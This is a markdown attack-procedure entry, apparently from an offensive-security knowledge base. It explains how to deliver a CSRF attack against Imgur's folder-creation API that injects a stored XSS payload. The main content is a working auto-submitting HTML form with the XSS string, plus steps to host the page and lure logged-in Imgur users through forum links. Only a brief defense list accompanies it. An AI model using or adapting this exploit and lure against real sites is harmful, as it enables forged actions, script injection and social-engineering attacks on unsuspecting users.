---
tags:
  - csrf
  - payload-delivery
  - imgur
  - social-engineering
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:56:03.934Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 9542dc60-da1b-43cc-be2f-d64df5345be3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Deliver-CSRF-Payload-via-Malicious-Page

## Summary

This procedure involves hosting and distributing a malicious web page that auto-submits a CSRF request to Imgur's folder creation endpoint, injecting the XSS payload.

## Description

By hosting a simple HTML page with a hidden form and JavaScript auto-submit, attackers can exploit cross-site request forgery when victims visit the page while authenticated to Imgur. The form targets https://api.imgur.com/3/folders with parameters for the malicious name and public visibility. Distribution occurs via links in communities like Reddit, where Imgur users overlap. This silently creates the folder, reducing detection.

## Requirements

1. Web hosting capability (local or remote server)
2. Victim in Imgur-related online communities
3. Valid Imgur session in victim's browser

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookies (Lax/Strict) and CSRF tokens
- Educate users on not visiting untrusted links while logged in
- Web Application Firewall (WAF) rules to block forged API requests

## Objectives

1. Automate folder creation without victim awareness
2. Integrate with social engineering for delivery
3. Chain with XSS for full exploitation

## Instructions

### Step 1: Construct the Malicious HTML

**Context**: Build the page to POST the payload to the API.

Use this HTML, replacing the name with your payload:

```html
<html><body><form action="https://api.imgur.com/3/folders" method="post" id="f"><input type="hidden" name="name" value="New Test\"><img src=x onerror=prompt(2)>"><input type="hidden" name="is_private" value="false"></form><script>document.getElementById('f').submit();</script></body></html>
```

> Save as index.html and host it.

### Step 2: Host and Lure Victim

**Context**: Make the page accessible and trick the victim into loading it.

Host via a server (e.g., at http://blackdoorsec.net/sandbox/imgur2.html) and share the link in relevant forums.

> Expected: Page loads, form submits, folder created.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[payload-delivery]]
- [[social-engineering]]
